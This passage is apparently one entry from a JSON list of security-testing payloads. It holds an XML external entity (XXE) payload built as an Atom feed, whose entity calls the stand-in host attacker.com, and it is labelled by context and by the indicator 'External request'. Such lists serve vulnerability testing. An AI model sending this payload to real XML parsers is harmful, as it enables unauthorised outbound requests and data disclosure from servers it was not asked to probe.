      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><feed xmlns=\"http://www.w3.org/2005/Atom\"><title>Test</title><entry><summary>&xxe;</summary></entry></feed>",
        "description": "Atom feed with external reference",
        "context": "Atom/XML",
        "indicator": "External request"
